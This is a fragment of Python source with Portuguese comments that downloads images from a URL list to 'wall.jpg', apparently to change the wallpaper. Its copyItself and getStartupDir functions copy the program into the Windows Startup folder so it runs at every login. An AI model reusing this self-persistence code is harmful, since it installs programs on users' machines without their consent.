#implement later
def getOutsideUrl(current_dir):

	file_path = join(current_dir,'new.txt') if current_dir else join( os.getcwd(),'new.txt')

	if(os.path.isfile(file_path)):
		news = open(file_path,'r')
		content = news.read()
		news.close()
		newurls = []
		newurls = content.split('\n')
		# os.remove(file_path)
		return newurls
	else:
		return [None]

#
def GetImg(query_imgs, outside_queries, outputdir):
	tries = 10
	while(tries):
		query_img = choice(query_imgs)
		keyword = outside_queries if outside_queries else query_img
		try:
			local_filename, _ = urllib.request.urlretrieve(keyword,join(outputdir,'wall.jpg'))
		except:
			tries-=1
		else:
			return local_filename
	return None 

#montando path para o diretorio de startup do windows
def getStartupDir():
	root_path = "C:\\Users"
	user = getuser()
	startup_path = "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
	return join(root_path,user,startup_path)


def copyItself(current_filename,new_filename,current_dir, new_dir):
	#ler proprio conteudo
	current_file = open(join(current_dir,current_filename),'rb')
	content = current_file.read()
	current_file.close()
	
	#mudando diretorio de trabalho para o diretorio de startup
	os.chdir(new_dir)

	#copiando conteudo para novo arquivo
	new_file = open(join(new_dir,new_filename),'wb')
	new_file.write(content)
	new_file.close()

	#retorna diretorio original
	os.chdir(current_dir)

